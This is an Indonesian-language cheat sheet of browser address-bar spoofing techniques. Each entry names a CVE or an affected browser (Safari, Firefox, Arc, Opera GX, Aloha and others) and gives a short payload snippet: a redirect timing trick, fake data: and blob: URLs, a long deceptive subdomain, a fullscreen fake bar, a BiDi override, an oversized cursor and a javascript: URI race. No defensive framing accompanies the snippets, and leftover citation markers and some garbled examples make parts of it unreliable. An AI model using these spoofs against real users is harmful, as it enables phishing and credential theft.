🌊 URL Freeze Attack CVE-2025-9183 Style
Teknik: Timing attack dengan redirect ke port unreachable. Browser meng-update address bar SEBELUM response diterima, menyebabkan URL legitimate tertinggal sementara konten tetap attacker-controlled[citation:1]. 
// Redirect to legitimate domain on blocked port
location.href = 'https://www.google.com:8081';
// Browser shows google.com but port is unreachable
setTimeout(() => { /* konten tetap */ }, 100);
📦 Data URI Spoofing Arc/Opera GX Vuln
Teknik: Memanfaatkan parsing flaw pada data: URI. Browser menampilkan string sebelum koma sebagai domain legitimate padahal isi dikontrol attacker[citation:1]. Ditemukan di Arc macOS & Opera GX Android. 
// data: URI dengan fake hostname
data://google.com/,<html><body>
<h1>Fake Page</h1></body></html>
📏 Long Subdomain Truncation CVE-2026-44659
Teknik: Eksploitasi browser yang memotong hostname panjang di address bar. Domain asli (attacker.com) tersembunyi, hanya fake subdomain yang terlihat[citation:6]. Zen Browser, Firefox Mobile rentan. 
// Subdomain extremely long
https://accounts.login.google.com.secure.
verify.trusted.this.is.very.long.subdomain.
evil.attacker.com
💾 Blob URL Hash Spoofing Safari WebKit
Teknik: Blob URL dengan hash fragment menampilkan spoofed URL. Safari memprioritaskan tampilan fragment, menyembunyikan origin asli[citation:1]. Ditemukan di berbagai versi Safari. 
// Blob URL dengan hash fragment
blob:https://real-origin.com/uuid#https://
apple.com/login
🖥 Fullscreen UI Spoof Multiple Browsers
Teknik: Memanfaatkan fullscreen mode yang menyembunyikan address bar asli, kemudian attacker menggambar fake address bar dengan CSS absolut[citation:1]. Opera Mobile, Chrome rentan. 
// Fullscreen + fake address bar
element.requestFullscreen();
// CSS absolute position fake bar
<div style="position:fixed;top:0;...">
https://www.bank.com</div>
🔄 RTL/LTR BiDi Spoof CVE-2023-5732
Teknik: Menggunakan karakter bidirectional Unicode untuk membalik/menyembunyikan domain asli[citation:7]. Firefox < 117, Thunderbird rentan. Karakter seperti U+202E (RLO) membalik teks. 
// Unicode RLO character
https://moc.elgoog//\u202E}moc.ekirtsa/
// Menampilkan: https://google.com/attacker
🔄 HTTP 204 No Content Arc Android
Teknik: Redirect ke URL yang meresponse HTTP 204 (No Content). Browser update address bar TAPI konten original tetap karena tidak ada konten baru[citation:1]. Arc Android rentan. 
// Redirect ke endpoint 204
fetch('/api/204', {method:'POST'});
location.href = 'https://google.com/api/204';
// Bar berubah, konten tetap
🖱 Oversized Cursor Spoof Safari (2025)
Teknik: Membuat custom cursor 128x128 untuk menimpa address bar Safari. Cursor image bisa menampilkan teks fake URL yang menutupi address bar asli[citation:5]. Apple menolak patch, dianggap "visual trick". 
// Oversized cursor
* { cursor: url('fakebar.png') 0 0, auto; }
// Cursor 128x128 pixels menutupi address bar
📱 Android visibilitychange CVE-2025-11718
Teknik: Saat user scroll di Android, address bar hide. Page mendeteksi visibilitychange dan overlay fake address bar[citation:8]. Firefox Android < 144 rentan. Phishing vector. 
// Detect scroll hide
document.addEventListener('visibilitychange',
() => { /* show fake bar */ });
🖼 iframe Frame Spoof CVE-2017-7011
Teknik: WebKit vulnerability menggunakan FRAME elements untuk spoof address bar[citation:9]. iOS < 10.3.3, Safari < 10.1.2 rentan. State management issue. 
// Multiple frames untuk spoof
<frameset><frame src="evil.html">
// Manipulate frame navigation timing
📝 Title Bar Spoof Aloha Browser
Teknik: Aloha Browser menampilkan <title> di address bar bukan origin[citation:10]. Attacker bisa spoof title jadi "google.com" padahal di evil site. 
// Title spoof for Aloha
<title>https://www.paypal.com</title>
// Browser menampilkan title sebagai URL
🔧 Internal URI Abuse Firefox iOS / Arc
Teknik: Redirect ke internal browser schemes seperti internal://local/errorpage?url=https://google.com menampilkan google.com di address bar[citation:1]. Firefox iOS, Arc rentan. 
// Internal scheme redirect
location.href = 'internal://local/errorpage?
url=https://www.google.com/.';
⚡ JS URI Race PlayStation Browser
Teknik: Race condition antara legitimate redirect dan JavaScript URI. Address bar locked ke legitimate URL sementara JS menulis konten attacker[citation:1]. Ditemukan di PS5 browser. 
// Race condition
location.href = 'https://google.com';
setTimeout(() => {
    open('javascript:document.write("evil")');
}, 1);
🔍 Search Query Spoof Opera GX / Arc iOS
Teknik: Browser mobile menampilkan search query di address bar. Regex flaw pada validasi search engine memungkinkan spoofing[citation:1]. google.pwn.wtf dianggap Google. 
// Search integration flaw
https://google.evil.com/?q=secure-login
// Browser treat sebagai Google search
📝 Unicode Whitespace CVE-like (Bentkowski)
Teknik: Karakter Unicode seperti U+08FC (whitespace-like) menyebabkan browser memotong URL[citation:1]. Chrome/Firefox menampilkan hanya prefix sebelum karakter tersebut. 
// Unicode whitespace character
https://accounts.google.com\u08FC
\u08FC\u08FC.evil.com
// Browser truncate di whitespace
